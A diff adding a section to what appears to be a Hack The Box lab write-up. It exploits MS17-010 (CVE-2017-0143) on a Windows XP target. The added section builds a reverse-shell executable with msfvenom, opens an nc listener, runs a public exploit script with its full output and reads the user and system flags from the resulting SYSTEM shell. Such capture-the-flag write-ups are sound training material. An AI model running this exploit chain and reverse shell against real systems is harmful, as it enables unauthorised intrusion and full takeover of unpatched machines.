@@ -205,3 +205,114 @@ Mode              Size  Type  Last modified              Name
 
 meterpreter > cat root.txt
 ```
+### CVE-2017-0143
+For exploitation of this CVE, we are not going to use metasploit module to exploit. Instead, we are going to use the script from [here](https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py) to exploit the vulnerability.
+To start off, we will first create a virtual environment with python2 in our local machine
+```code
+┌──(kali㉿kali)-[~]
+└─$ pip3 install virtualenv 
+```
+Afterwards, we will have to add the ```virtualenv``` module to path so that we can call it from any diirectory. 
+```code
+┌──(kali㉿kali)-[~]
+└─$ cd /home/kali/.local/bin  && sudo mv virtualenv /usr/local/bin/
+```
+Next we will then create our virtual environment that is running on ```python 2.7``` and activate the virtual environment.
+* /home/kali/Desktop/htb : Location that we want to save our virtual environment packages
+```code
+┌──(kali㉿kali)-[~]
+└─$ virtualenv --python=/usr/bin/python2.7 /home/kali/Desktop/htb && source htb/bin/activate
+```
+Next, we will have to clone the repository and install ```impacket``` using ```pip``` as it is a dependency tthat we need later
+```code
+┌──(htb)─(kali㉿kali)-[~]
+└─$ git clone https://github.com/helviojunior/MS17-010 && pip install impacket 
+```
+The exploit runs with the following syntax below. Hence, we will need to create an executable file that can spawn a reverse TCP listener shell.
+```code
+send_and_execute.py <ip> <executable_file> [port] [pipe_name]
+```
+To do so, we will create the listener executable with ```msfvenom```
+```code
+┌──(kali㉿kali)-[~/Desktop/MS17-010]
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.250 LPORT=443 EXITFUNC=thread -f exe -a x86 — platform windows -o rev_shell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+```
+Next, we will open a listener shell on the attacker machine 
+```code
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -nlvp 443
+```
+Afterwards, we will execute the exploit
+```code
+┌──(htb)─(kali㉿kali)-[~/Desktop/MS17-010]
+└─$ python2 send_and_execute.py 10.10.10.4 rev_shell.exe             1 ⨯ 2 ⚙
+Trying to connect to 10.10.10.4:445
+Target OS: Windows 5.1
+Using named pipe: browser
+Groom packets
+attempt controlling next transaction on x86
+success controlling one transaction
+modify parameter count to 0xffffffff to be able to write backward
+leak next transaction
+CONNECTION: 0x8202fd68
+SESSION: 0xe1855430
+FLINK: 0x7bd48
+InData: 0x7ae28
+MID: 0xa
+TRANS1: 0x78b50
+TRANS2: 0x7ac90
+modify transaction struct for arbitrary read/write
+make this SMB session to be SYSTEM
+current TOKEN addr: 0xe1951d00
+userAndGroupCount: 0x3
+userAndGroupsAddr: 0xe1951da0
+overwriting token UserAndGroups
+Sending file U0MPM5.exe...
+Opening SVCManager on 10.10.10.4.....
+Creating service smXX.....
+Starting service smXX.....
+The NETBIOS connection with the remote host timed out.
+Removing service smXX.....
+ServiceExec Error on: 10.10.10.4
+nca_s_proto_error
+Done
+```
+Finally, we will receive a connection on the attacker machine
+```code
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.16.250] from (UNKNOWN) [10.10.10.4] 1028
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32>
+```
+
+#### Obtaining user flag
+```code
+C:\WINDOWS\system32>cd ../..
+cd ../..
+C:\>cd Documents and Settings\john\desktop 
+cd Documents and Settings\john\desktop
+C:\Documents and Settings\john\Desktop>type user.txt
+type user.txt
+<Redacted user flag>
+```
+
+#### Obtaining system flag
+```code
+C:\Documents and Settings\john\Desktop>cd ../..
+cd ../..
+C:\Documents and Settings>cd Administrator\Desktop
+cd Administrator\Desktop
+C:\Documents and Settings\Administrator\Desktop>type root.txt
+type root.txt
+<Redacted system flag>
+C:\Documents and Settings\Administrator\Desktop>
+```
